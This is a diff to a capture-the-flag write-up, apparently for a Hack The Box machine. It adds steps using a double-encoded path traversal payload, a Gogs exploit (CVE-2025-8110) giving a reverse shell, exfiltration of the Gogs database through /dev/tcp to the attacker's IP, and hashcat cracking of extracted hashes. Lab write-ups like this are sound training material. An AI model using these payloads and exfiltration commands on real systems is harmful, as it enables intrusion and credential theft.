@@ -288,6 +288,150 @@ MRUListEx = 0
 {% code overflow="wrap" %}
 ```
 /api/download/%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255CUsers%255Csvc_canary%255CAppData%255CRoaming%255CMicrosoft%255CWindows%255CRecent%255Cdb.zip.lnk
+
+\Users\svc_canary\Documents\Operations\Management\db.zip
 ```
 {% endcode %}
+
+**it give us the path for the real zip**&#x20;
+
+{% code overflow="wrap" %}
+```
+C:\Users\svc_canary\Documents\Operations\Management\db.zip
+
+/api/download/%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255CUsers%255Csvc_canary%255CDocuments%255COperations%255CManagement%255Cdb.zip 
+```
+{% endcode %}
+
+**And it works**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+unzip db.zip
+# we've got a KeePass 2 password database , let;s try to open it using the master key 
+keepass2 db.kdbx
+
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Since in toolkit repos we have one user that is not migrated to central services we will login usign hsi creds**
+
+{% code overflow="wrap" %}
+```bash
+vroth:mOo03jpsqx8JQYMBwvFP
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 8**</mark>
+
+**Now we will focus on the RCE to take a rev shell**
+
+{% code overflow="wrap" %}
+```bash
+python3 CVE-2025-8110.py -u http://gpz-op26-toolkits.ghostlink.htb/ -lh 10.10.14.92 -lp 4444 -user vroth -pass 'mOo03jpsqx8JQYMBwvFP'
+
+listener 4444
+connect to [10.10.14.92] from (UNKNOWN) [10.129.43.225] 49852
+bash: cannot set terminal process group (697): Inappropriate ioctl for device
+bash: no job control in this shell
+git@gpz-op26-toolkits:~/data/tmp/local-repo/7$
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+git@gpz-op26-toolkits:~/data/ssh$ cd /home
+cd /home
+git@gpz-op26-toolkits:/home$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root     root     4096 Mar  9 19:25 .
+drwxr-xr-x 18 root     root     4096 May  5 15:22 ..
+drwxr-x---  3 nvirelli nvirelli 4096 Jul  1 17:30 nvirelli
+```
+{% endcode %}
+
+**This give us a better idea that this user is local user on the target now let's try to pivot**&#x20;
+
+<mark style="color:blue;">**Step 9**</mark>
+
+{% code overflow="wrap" %}
+```bash
+git@gpz-op26-toolkits:~/custom/conf$ cat app.ini
+
+[database]
+TYPE     = sqlite3
+HOST     = 127.0.0.1:5432
+NAME     = gogs
+SCHEMA   = public
+USER     = gogs
+PASSWORD =
+SSL_MODE = disable
+PATH     = data/gogs.db
+```
+{% endcode %}
+
+**we tranfer the database and we open it locally**
+
+{% code overflow="wrap" %}
+```bash
+nc -lvp 4444 > gogs.db
+cat /opt/gogs/data/gogs.db > /dev/tcp/10.10.14.92/4444
+
+sqlite3 gogs.db
+.schema
+SELECT id, name, passwd, is_admin FROM user;
+#2|nvirelli|8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8|1
+
+```
+{% endcode %}
+
+[https://github.com/shinris3n/GogsToHashcat](https://github.com/shinris3n/GogsToHashcat)
+
+**But we need to extract the SALT also**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sqlite3 gogs.db "SELECT salt FROM user WHERE name='nvirelli';"
+DW3YdxPy25
+
+python3 GogsToHashcat.py  DW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8 -o hashcat.hash
+# sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=
+```
+{% endcode %}
+
+**we have this password policies that says min lenght is 20**&#x20;
+
+<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```bash
+grep -E '^.{20,}$' /usr/share/wordlists/rockyou.txt  > wordlists.txt
+
+hashcat -m 10900 hashcat.hash wordlists.txt --potfile-disable
+u47YUclrDiwWxBheaSzI
+```
+{% endcode %}
+
+**I prefer running the exploit another time to ahve a shell with nvirelli**
+
+<mark style="color:blue;">**Step 9**</mark>
+
+{% code overflow="wrap" %}
+```bash
+ip a
+
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:15:5d:32:7a:01 brd ff:ff:ff:ff:ff:ff
+    altname enx00155d327a01
+    inet 172.16.20.20/24 brd 172.16.20.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::215:5dff:fe32:7a01/64 scope link proto kernel_ll
+       valid_lft forever preferred_lft forever
+```
+{% endcode %}
+
+**Let's pivot to AD and start scanning**
 
